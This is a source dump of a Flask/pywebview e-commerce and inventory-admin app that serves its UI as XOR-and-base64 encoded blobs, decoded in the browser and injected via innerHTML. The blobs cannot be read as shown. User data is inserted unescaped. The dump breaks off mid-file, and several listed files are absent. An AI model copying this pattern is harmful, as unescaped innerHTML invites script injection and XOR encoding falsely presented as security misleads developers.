# Project Source Code


### source

```
.
├── README.md
├── admin_app
│   ├── __init__.py
│   ├── admin_api.py
│   ├── admin_app.py
│   ├── admin_main.py
│   ├── admin_payload.py
│   └── admin_views.py
├── assets
│   ├── fonts
│   │   └── RocaOne.ttf
│   └── images
│       ├── 9.jpg
│       ├── lanyard.png
│       ├── pup_logo.png
│       └── tshirt.png
├── requirements.txt
├── shared
│   ├── __init__.py
│   ├── builder.py
│   └── database.py
└── shop_app
    ├── __init__.py
    ├── api.py
    ├── app.py
    ├── content_payload.py
    ├── layout_payload.py
    ├── main.py
    └── payload.py

7 directories, 24 files

```

---

## File: `./requirements.txt`

```text
Flask
pywebview
dominate
Pillow
pyinstaller
```


---

## File: `./admin_app/admin_api.py`

```python
from shared import database

class Api:
    def get_products(self):
        return database.get_all_products()
    
    def add_product(self, name, price, quantity, description):
        try:
            
            price_float = float(price)
            quantity_int = int(quantity)
            if not name:
                return {'status': 'error', 'message': 'Item name cannot be empty.'}
            database.add_product(name, price_float, quantity_int, description)
            return {'status': 'success'}
        except (ValueError, TypeError):

            return {'status': 'error', 'message': 'Please provide valid numbers for Price and Quantity.'}

    def update_product(self, product_id, name, price, quantity, description):
        try:
            price_float = float(price)
            quantity_int = int(quantity)
            if not name:
                 return {'status': 'error', 'message': 'Item name cannot be empty.'}
            database.update_product(product_id, name, price_float, quantity_int, description)
            return {'status': 'success'}
        except (ValueError, TypeError):
            return {'status': 'error', 'message': 'Please provide valid numbers for Price and Quantity.'}

    def delete_product(self, product_id):
        database.delete_product(product_id)
        return {'status': 'success'}
```

---

## File: `./admin_app/admin_app.py`

```python
from flask import Flask, jsonify
from . import admin_payload

app = Flask(__name__)

XOR_KEY = "Admin-Panel-Key-2024"

@app.route('/')
def admin_bootloader():
    js_template = """
        <script>
            const K="##XOR_KEY##";
            function D(b) {
                const s=atob(b);
                let r="";
                for(let i=0;i<s.length;i++) {
                    r+=String.fromCharCode(s.charCodeAt(i)^K.charCodeAt(i%K.length));
                }
                return r;
            }
            async function I() {
                const r=await fetch('/data');
                const p=await r.json();
                document.getElementById('root').innerHTML=D(p.payload);
                loadInventory();
            }
            
            async function loadInventory() {
                const p = await window.pywebview.api.get_products();
                document.getElementById('inventory-body').innerHTML = p.map(i => `
                    <tr class="border-b hover:bg-gray-50 cursor-pointer" onclick='selectItem(${JSON.stringify(i)})'>
                        <td class="p-2">${i.id}</td>
                        <td class="p-2">${i.name}</td>
                        <td class="p-2">${i.stock}</td>
                        <td class="p-2">₱${i.price.toFixed(2)}</td>
                    </tr>
                `).join('');
            }

            function selectItem(itemObject) {
                document.getElementById('item-id').value = itemObject.id;
                document.getElementById('item-name').value = itemObject.name;
                document.getElementById('item-quantity').value = itemObject.stock;
                document.getElementById('item-price').value = itemObject.price;
                document.getElementById('item-description').value = itemObject.description || '';
            }
            
            function clearForm() {
                document.getElementById('item-form').reset();
                document.getElementById('item-id').value='';
            }
            
            async function handleAddItem() {
                const data={name:document.getElementById('item-name').value,quantity:document.getElementById('item-quantity').value,price:document.getElementById('item-price').value,description:document.getElementById('item-description').value};
                const r = await window.pywebview.api.add_product(data.name,data.price,data.quantity,data.description);
                if(r && r.status==='error') alert(r.message);
                clearForm();
                loadInventory();
            }
            async function handleUpdateItem() {
                const id=document.getElementById('item-id').value;
                if(!id) { alert('Select an item first.'); return; }
                const data={name:document.getElementById('item-name').value,quantity:document.getElementById('item-quantity').value,price:document.getElementById('item-price').value,description:document.getElementById('item-description').value};
                const r = await window.pywebview.api.update_product(id,data.name,data.price,data.quantity,data.description);
                if(r && r.status==='error') alert(r.message);
                clearForm();
                loadInventory();
            }
            async function handleDeleteItem() {
                const id=document.getElementById('item-id').value;
                if(!id) { alert('Select an item first.'); return; }
                if(confirm('Are you sure?')) {
                    await window.pywebview.api.delete_product(id);
                    clearForm();
                    loadInventory();
                }
            }

            window.addEventListener('pywebviewready', I);
        </script>
    """

    js_bootloader = js_template.replace("##XOR_KEY##", XOR_KEY)

    return f"""
    <!DOCTYPE html><html lang="en"><head>
        <meta charset="UTF-8"><title>Admin Panel</title><script src="https://cdn.tailwindcss.com"></script>
    </head><body>
        <div id="root">Loading Admin Panel...</div>
        {js_bootloader}
    </body></html>
    """

@app.route('/data')
def get_admin_payload():
    return jsonify({'payload': admin_payload.ADMIN_PAYLOAD})

```

---

## File: `./admin_app/admin_main.py`

```python
import webview
import threading
from admin_app.admin_app import app
from admin_app.admin_api import Api as AdminApi

def run_flask():
    app.run(host='127.0.0.1', port=5001)

if __name__ == '__main__':
    flask_thread = threading.Thread(target=run_flask)
    flask_thread.daemon = True
    flask_thread.start()

    api = AdminApi()
    webview.create_window(
        'PUP Shop Admin',
        'http://127.0.0.1:5001',
        js_api=api,
        width=1024,
        height=768
    )
    webview.start()
```

---

## File: `./admin_app/admin_payload.py`

```python
ADMIN_PAYLOAD = "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"
```

---

## File: `./admin_app/admin_views.py`

```python
import dominate
from dominate.tags import *
from dominate.util import raw

def generate_admin_page():
    doc = dominate.document(title="Shop Admin - Inventory")
    with doc.head:
        meta(charset="UTF-8")
        link(href="https://cdn.jsdelivr.net/npm/tailwindcss@2.2.19/dist/tailwind.min.css", rel="stylesheet")

    with doc.body(class_="bg-gray-100 p-8"):
        h1("PUP Shop - Inventory Management", class_="text-3xl font-bold text-gray-800 mb-6")
        
        with div(class_="bg-white p-6 rounded-lg shadow-md mb-8"):
            h2("Manage Item", class_="text-xl font-semibold mb-4")
            with form(id="item-form", class_="grid grid-cols-1 md:grid-cols-2 gap-4"):
                input_(type="hidden", id="item-id")
                input_(type="text", id="item-name", placeholder="Item Name", class_="p-2 border rounded")
                input_(type="number", id="item-quantity", placeholder="Quantity", class_="p-2 border rounded")
                input_(type="number", id="item-price", placeholder="Price (PHP)", step="0.01", class_="p-2 border rounded")
                textarea(id="item-description", placeholder="Description", rows="3", class_="p-2 border rounded md:col-span-2")
            with div(class_="flex space-x-2 mt-4"):
                button("Add Item", onclick="addItem()", class_="bg-blue-500 text-white px-4 py-2 rounded")
                button("Update Item", onclick="updateItem()", class_="bg-green-500 text-white px-4 py-2 rounded")
                button("Delete Item", onclick="deleteItem()", class_="bg-red-500 text-white px-4 py-2 rounded")
                button("Clear Form", type="button", onclick="clearForm()", class_="bg-gray-500 text-white px-4 py-2 rounded")
        
        with div(class_="bg-white p-6 rounded-lg shadow-md"):
            h2("Current Inventory", class_="text-xl font-semibold mb-4")
            with table(id="inventory-table", class_="w-full text-left"):
                with thead(class_="border-b-2"):
                    with tr():
                        th("ID", class_="p-2")
                        th("Name", class_="p-2")
                        th("Quantity", class_="p-2")
                        th("Price", class_="p-2")
                tbody(id="inventory-body")

        script(raw("""
            function initializeAdminPanel() {
                if (window.pywebview && window.pywebview.api) {
                    loadInventory();
                } else {
                    console.log("pywebview API not ready, waiting...");
                    setTimeout(initializeAdminPanel, 100);
                }
            }

            async function loadInventory() {
                try {
                    const products = await window.pywebview.api.get_products();
                    const tbody = document.getElementById('inventory-body');
                    tbody.innerHTML = products.map(p => `
                        <tr class="border-b hover:bg-gray-50 cursor-pointer" onclick='selectItem(${JSON.stringify(p)})'>
                            <td class="p-2">${p.id}</td>
                            <td class="p-2">${p.name}</td>
                            <td class="p-2">${p.stock}</td>
                            <td class="p-2">₱${p.price.toFixed(2)}</td>
                        </tr>
                    `).join('');
                } catch (e) {
                    console.error("Failed to load inventory:", e);
                    alert("Error communicating with the application backend.");
                }
            }
            
            function selectItem(productObject) {
                document.getElementById('item-id').value = productObject.id;
                document.getElementById('item-name').value = productObject.name;
                document.getElementById('item-quantity').value = productObject.stock;
                document.getElementById('item-price').value = productObject.price;
                document.getElementById('item-description').value = productObject.description || '';
            }

            function clearForm() {
                document.getElementById('item-form').reset();
                document.getElementById('item-id').value = '';
            }
            
            async function addItem() {
                const name = document.getElementById('item-name').value;
                const quantity = document.getElementById('item-quantity').value;
                const price = document.getElementById('item-price').value;
                const description = document.getElementById('item-description').value;
                if (!name || !quantity || !price) { alert('Please fill all required fields'); return; }
                await window.pywebview.api.add_product(name, price, quantity, description);
                clearForm();
                loadInventory();
            }

            async function updateItem() {
                const id = document.getElementById('item-id').value;
                if (!id) { alert('Please select an item from the list to update.'); return; }
                const name = document.getElementById('item-name').value;
                const quantity = document.getElementById('item-quantity').value;
                const price = document.getElementById('item-price').value;
                const description = document.getElementById('item-description').value;
                await window.pywebview.api.update_product(id, name, price, quantity, description);
                clearForm();
                loadInventory();
            }

            async function deleteItem() {
                const id = document.getElementById('item-id').value;
                if (!id) { alert('Please select an item to delete.'); return; }
                if (confirm('Are you sure you want to delete this item?')) {
                    await window.pywebview.api.delete_product(id);
                    clearForm();
                    loadInventory();
                }
            }

            document.addEventListener('DOMContentLoaded', initializeAdminPanel);
        """))

    return doc

```


---

## File: `./shop_app/api.py`

```python
from shared import database

class Api:
    def __init__(self):
        self.current_user = None

    def login(self, email, password):
        user = database.check_user_credentials(email, password)
        if user:
            self.current_user = user
            return {'success': True, 'user': {'id': user['id'], 'name': user['name']}}
        return {'success': False, 'message': 'Invalid credentials.'}

    def register(self, name, email, password):
        success = database.create_user(name, email, password)
        return {'success': success, 'message': 'Registration successful!' if success else 'Email already in use.'}
    
    def logout(self):
        self.current_user = None
        return {'success': True}

    def get_products(self):
        return database.get_all_products()

    def get_cart(self):
        if not self.current_user: return []
        return database.get_cart_items(user_id=self.current_user['id'])

    def add_to_cart(self, product_id):
        if not self.current_user: return {'status': 'error', 'message': 'Please log in.'}
        database.add_to_cart(product_id=product_id, user_id=self.current_user['id'])
        return {'status': 'success'}

    def update_cart_quantity(self, product_id, quantity):
        if not self.current_user: return {'status': 'error'}
        database.update_cart_quantity(product_id=product_id, user_id=self.current_user['id'], quantity=quantity)
        return {'status': 'success'}

    def place_order(self):
        if not self.current_user:
            return {'success': False, 'message': 'User not logged in.'}
        
        order_id = database.create_order(user_id=self.current_user['id'])
        
        if order_id:
            return {'success': True, 'order_id': order_id, 'message': f'Order #{order_id} placed successfully!'}
        else:
            return {'success': False, 'message': 'Your cart is empty.'}
```

---

## File: `./shop_app/app.py`

```python
from flask import Flask, jsonify
from . import payload

app = Flask(__name__, static_folder='../assets', static_url_path='/static')

XOR_KEY = "PUP-Sinta-2024-IskolarNgBayan"

@app.route('/')
def bootloader():
    """secure application."""
    bootloader_html = f"""
<!DOCTYPE html><html lang="en">
<head>
    <meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>PUP E-Commerce Shop</title>
    <script src="https://cdn.tailwindcss.com"></script><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.4.0/css/all.min.css">
    <style>:root{{--pup-burgundy:#722F37;}}.pup-bg-burgundy{{background-color:var(--pup-burgundy);}}.pup-text-burgundy{{color:var(--pup-burgundy);}}.page-view,.app-view{{display:none;}}.page-view.active,.app-view.active{{display:block;}}.bottom-nav{{position:fixed;bottom:0;left:0;right:0;z-index:50;}}.content-container{{padding-bottom:80px;}}.cart-badge{{position:absolute;top:-5px;right:-5px;background:#EF4444;color:white;border-radius:50%;width:18px;height:18px;font-size:11px;display:flex;align-items:center;justify-content:center;}}</style>
</head>
<body class="bg-gray-100">
    <div id="root"><p style="text-align:center;padding:4rem;font-family:sans-serif;">Loading Secure Application...</p></div>
    <script>
        const K="{XOR_KEY}";
        function D(b){{const s=atob(b);let r="";for(let i=0;i<s.length;i++)r+=String.fromCharCode(s.charCodeAt(i)^K.charCodeAt(i%K.length));return r;}}
        async function I(){{try{{const r=await fetch('/data');const p=await r.json();const root=document.getElementById('root');root.innerHTML=D(p.auth)+D(p.app);document.getElementById('login-form').addEventListener('submit',handleLogin);document.getElementById('register-form').addEventListener('submit',handleRegister);L();}}catch(e){{root.innerHTML='<p style="color:red;text-align:center;">Failed to load application.</p>';console.error("Bootloader Error:",e);}}}}
        
        function L(){{
            window.pywebview.api.get_products().then(p => {{
                if (!p) return;
                document.getElementById('product-list').innerHTML = p.map(i => `
                    <div class="bg-white p-4 rounded-lg shadow-md flex items-center space-x-4">
                        <img src="${{i.image_url || '/static/images/placeholder.png'}}" alt="${{i.name}}" class="w-20 h-20 object-cover rounded-lg bg-gray-200">
                        <div class="flex-1">
                            <h4 class="font-semibold">${{i.name}}</h4>
                            <p class="text-sm text-gray-500">₱${{i.price.toFixed(2)}}</p>
                        </div>
                        <button onclick="handleAddToCart(${{i.id}})" class="bg-red-500 text-white px-4 py-2 rounded-full font-bold text-sm">ADD</button>
                    </div>
                `).join('') || '<p>No products available.</p>';
            }});
        }}

        function showAuthSection(id){{document.querySelectorAll('.auth-section').forEach(s=>s.style.display='none');document.getElementById(id).style.display='block';}}
        function showAppSection(id){{document.querySelectorAll('.app-view').forEach(s=>s.style.display='none');document.getElementById(id).style.display='block';if(id==='cart-app-view')loadCart();if(id==='checkout-app-view')loadCheckoutSummary();}}
        function showMainApp(user){{document.getElementById('auth-view').style.display='none';document.getElementById('main-app-view').style.display='block';document.getElementById('user-name-display').textContent=`Welcome, ${{user.name}}!`;updateCartBadge();}}
        function showAuthView(){{document.getElementById('main-app-view').style.display='none';document.getElementById('auth-view').style.display='block';showAuthSection('login-section');}}
        async function handleLogin(e){{e.preventDefault();const r=await window.pywebview.api.login(document.getElementById('login-email').value,document.getElementById('login-password').value);if(r.success)showMainApp(r.user);else alert(r.message);}}
        async function handleRegister(e){{e.preventDefault();const r=await window.pywebview.api.register(document.getElementById('register-name').value,document.getElementById('register-email').value,document.getElementById('register-password').value);if(r.success){{alert('Registration successful!');showAuthSection('login-section');}}else alert(r.message);}}
        async function handleLogout(){{await window.pywebview.api.logout();showAuthView();}}
        async function handleAddToCart(id){{const r=await window.pywebview.api.add_to_cart(id);if(r.status==='success'){{showNotification('Added to cart!');updateCartBadge();}}else alert(r.message);}}
        async function handleUpdateQuantity(id,qty){{await window.pywebview.api.update_cart_quantity(id,qty);loadCart();}}
        async function handlePlaceOrder(){{const r=await window.pywebview.api.place_order();alert(r.message);if(r.success){{showAppSection('homepage-app-view');updateCartBadge();}}}}
        async function loadCart(){{const items=await window.pywebview.api.get_cart();const cont=document.getElementById('cart-items');const summary=document.getElementById('cart-summary');if(!items||items.length===0){{cont.innerHTML='<p class="text-center text-gray-500 py-8">Your cart is empty.</p>';summary.style.display='none';return;}}cont.innerHTML=items.map(i=>`<div class="bg-white p-3 rounded shadow flex justify-between items-center"><div><p class="font-semibold">${{i.name}}</p><p class="text-xs text-gray-600">₱${{i.price.toFixed(2)}}</p></div><div class="flex items-center space-x-2"><button onclick="handleUpdateQuantity(${{i.id}},${{i.quantity-1}})" class="font-bold w-6 h-6 bg-gray-200 rounded-full">-</button><span>${{i.quantity}}</span><button onclick="handleUpdateQuantity(${{i.id}},${{i.quantity+1}})" class="font-bold w-6 h-6 bg-gray-200 rounded-full">+</button></div></div>`).join('');const total=items.reduce((s,i)=>s+(i.price*i.quantity),0);document.getElementById('cart-total').textContent=`₱${{total.toFixed(2)}}`;summary.style.display='block';}}
        async function loadCheckoutSummary(){{const items=await window.pywebview.api.get_cart();if(!items||items.length===0)return;const summaryCont=document.getElementById('checkout-summary-items');summaryCont.innerHTML=items.map(i=>`<div class="flex justify-between"><span>${{i.name}} x${{i.quantity}}</span><span>₱${{(i.price*i.quantity).toFixed(2)}}</span></div>`).join('');const total=items.reduce((s,i)=>s+(i.price*i.quantity),0);document.getElementById('checkout-total').textContent=`₱${{total.toFixed(2)}}`;}}
        async function updateCartBadge(){{const items=await window.pywebview.api.get_cart();const count=!items?0:items.reduce((s,i)=>s+i.quantity,0);document.querySelectorAll('.cart-badge').forEach(b=>{{b.style.display=count>0?'flex':'none';b.textContent=count;}});}}
        function showNotification(msg){{const el=document.createElement('div');el.className='fixed top-5 left-1/2 -translate-x-1/2 bg-green-600 text-white px-4 py-2 rounded-lg shadow-lg z-50';el.textContent=msg;document.body.appendChild(el);setTimeout(()=>el.remove(),2000);}}
        
        window.addEventListener('pywebviewready', I);
    </script>
</body></html>
    """
    return bootloader_html

@app.route('/data')
def get_payload_data():
    """Serves the obfuscated UI data as JSON."""
    return jsonify({'auth': payload.AUTH_PAYLOAD, 'app': payload.APP_PAYLOAD})
```

---

## File: `./shop_app/content_payload.py`

```python
from shared.builder import ContentBuilder

content_builder = ContentBuilder(key="PUP-Sinta-2024-IskolarNgBayan")
content_builder.a("bDE5W3MACklDTEdEWhlbIBYcTUwCHi8UMVxbEQ83MH1bOgwZVABORllEUQ93U0tPTEFOPQIhFRAOAHA8NBBxBQETCEMfQw==")
content_builder.a("NTYkRDwHTFQCQVNDQQkPKAYfB0ESFy0TKw4XQQ8zITlbNkkeWVUPDBASFA1pU0tPTF0WJxFiAhUAHSNoclk2ERpZAkhcRA==")
content_builder.a("NSdwQDFEWFZfEVtdVRReOxBWTUMSBi8TKwJWCAMxMjVefBkbBD5BXVddGl0nFElPDQ0Gc0USNClBIj8yPw9zCgIVEl4PEg==")
content_builder.a("J3hiHXMBQ0ZRDV9IH1VYPRxLAg5MRmxZfglLQQ08NCNebksaERlZHwJKWA0vHAUbQQMdIgNiEQwRQyQwKFl+CxsGBlhcVA==")
content_builder.a("KXduejYFDRsMSBJyU1dGZVMiHAcOHi8VY11WCVxuaX9JOh9QVEENEhASFA1pTw0AHgxSJwN/QxUOCTk7fUs8GwNWQU5eUQ==")
content_builder.a("IyZtDzEOQwMJREZVEkZCPB0PCghMHilHMQkYBQEneDxKcxlDQkFeQlFRUQAwXl9NUl0WJxF8XRUADDU5cE4/CB0HXA9QXA==")
content_builder.a("PzY7DTUGAABMXlddW1ZCJRdLAg5MQ2xZBwwYCAJqaX9BMgsLGF8RW15CQVlpGg9STg0dKQ4sTBwMDzk5cg0nEB4RXA9XXQ==")
content_builder.a("MTw8D3MKAhUSXg8SRRlLPB8HTxxMQW4FLRMdBBxwJz9YPQ0LEExBVRIMCAItGh1RUAUbOFl+DRgDCzx1M0EyGh1JQ09eXw==")
content_builder.a("Mz5wSzwHGlkSSF9ZUFtBLVMGDUFQUHA3IxIKFgEiMWoRfAUPFgRBDAxbWl08B0sGCFxQIgglCBdMHjEmI1o8GwpWQVlLQA==")
content_builder.a("NWhyXTIaHQMOX1YSEldBKAAYUk4WXygSLg1ZEUNjdTJCIQ0LBkFfXUVcUEgtXgcITl9OYQMrF0ddCjkjcE4/CB0HXA9BQA==")
content_builder.a("MTY1ACpEXVQRWR8CEAoRKwYfGwMPUjoeMgREQx0lNz1EJ0tOFw1MQUMPFlpkFR4DAEECOxdvAx5MDCUnN1g9DRdUFUhKRA==")
content_builder.a("fSI4RCcMTgQYAAEQQFtYJxcOC0ENFW4BLQ8NTB01ODlPPAUKVl9hfXd7ehFmER4bGA4ccFsgFA0VAT51JFQjDFNWA1hGRA==")
content_builder.a("PztyDTwHDRgITlkNEEdFJgQqGhgJISsENggWD0Z3JzVKOhoaERMAQVVRQEQmHUxGTkERIgYxEkRDGX0zJUE/SQwTTE5LUQ==")
content_builder.a("PnhkHWNJGhEZWR9HWl1ZLFMbFkFSUjwINw8dBAp9OTcNNQYAAExeV11bVkIlF0lRLxMXLxMnQTgCDT8gPllvRgwBFVldXg==")
content_builder.a("bml/STofUEhOS11CXwoNaVNLT1BOASsENggWD1BwdXANc1UdEQJZW19cFEQtTkkdCQYbPRMnE1QSCzMhOUI9S04XDUxBQw==")
content_builder.a("bXcxWCcBQwcETkZZXVoNOV5fTUwSBjcLJ1xbBQcjJTxMKlNOGg5DVwsQChEtGh1PDw0TPRR/Qw0EFiR4M0g9HQsGQUBQHQ==")
content_builder.a("ZnduEToECVQSX1ENEBtePRIfBg9OGyMGJQQKTh4lJQ9BPA4BWhFDVRISVUE9Tkk/OTFSAgglDltBDTw0I15uSxlZUx0SWA==")
content_builder.a("fWdgDT4RQxUUWV0QX1YAfVFVUwRTUi0LIxIKXEwkMChZflsWGEFLXV5GGU8mHw9PHBQCYxMnGQ1MDCUnN1g9DRdWX2BHXA==")
content_builder.a("MXUjTCoGTgQAX1MQQVUNKxISDgJdXSZVfF1WBQcma2xLPBsDVAhJDxJAUUogAB8KHkwUIRUvQ1kCAjEmIxBxCwlZFkVbRA==")
content_builder.a("NXUiQiYHChEFAF5XEkdFKBcEGEENFW4Xb1dZEh4xNjUAKkRaVl8RVllEChElEgkKAEERIgYxEkRDDDw6M0ZzDwEaFQBBVQ==")
content_builder.a("PTwyQj8NThkDAAMSDHpMJBZRU0MNEywCLl9FCAAgICQNOg1TVhNIVVlBQEg7XgUOAQRQbhM7ERxcTCQwKFlxSQ0YAF5BDQ==")
content_builder.a("ciJ9SyYFAlQRAAEQUFtfLRYZTx4OByADJwVUDQlya2wCNwAYSl1JW0YMCEEoEQ4DTAIeLxQxXFsDAj82Ow01BgAATF5XXQ==")
content_builder.a("OTc/QTdJAxZMHBAOd1lMIB9RU0MNEywCLl9FCAAgICQNOg1TVhNIVVlBQEg7Xg4CDQgebEc2GAkEU3IwPUw6BUxUAkFTQw==")
content_builder.a("I2hyWn4PGxgNDUIdARRPJgEPCh5BACESLAUcBUM8MnITb0YKHRcTDlRbQhN1HwoNCQ1SLQsjEgpcTDI5P044SQgbD1kfQw==")
content_builder.a("NTg5TzwFClQMTx8BEAp9KAAYGAMTFnRbbQ0YAws8a2xEPRkbAEFEVg0QRkguGhgbCRNfPgYxEg4OHDR3cFkqGQtJQ11TQw==")
content_builder.a("IyI/XzdLThcNTEFDDxZaZBUeAwBBAmNUYgMWEwo1J3BfPBwAEARJH1xVFhN1XA8GGl9OKg40QRoNDyMmbQ8gGQ8XBABLHQ==")
content_builder.a("Y3UgWX5bTEpdT0dERltDaQcSHwlcUD0SIAwQFUxwNjxMIBpTVhYAVEVeWA0rFEYMFQAcY1JyUVkVCyghfVo7ABoRQV1LHQ==")
content_builder.a("Y3UiQiYHChEFAF5XElJCJwdGHAkMGywILgVbXzwVEhl+Byw8SE5PR0RGW0N3TwkaGBUdIEc2GAkEU3I3JVknBgBWQUJcUw==")
content_builder.a("PDwzRm5LHRwOWnNFRlx+LBAfBgMPWmkLLQYQD0MjMDNZOgYAU0gPElNeVV46TkkYQQcHIgtiAx5MCSI0KQBgWV5UFUhKRA==")
content_builder.a("fTIiTCpEVkRRDUJJHwcNOxweAQgEFmMLJUEfDgAkeCNIPgAMGw1JEA5wVU4iUx8ATC09CS4MXVYDGyQhP0NtVUEQCFsMDA==")
content_builder.a("fzM/Xz5XUlsSSFFEW1tDd1NXQAgIBHBHfgUQF045MW0PPggHGkxMQkAfQkQsBElPDw0TPRR/QwkACTV4JkQ2HkxKQQ0SEA==")
content_builder.a("cGk4SDINCwZBTl5RQUcQawMeH0EDFWMFNxMeFAA0LHBZNhEaWRZFW0RXFF1kR0scBAAWIRBvDR5BHSQ8M0YqSRobEQACEA==")
content_builder.a("KnhkHXFXUhAIWxJTXlVeOk5JCQAECm4ONgQUEkMzMD5ZNhtOHhReRllUTQArFh8YCQQcbFl+BRAXTjM5MV4gVEwSDUhKEA==")
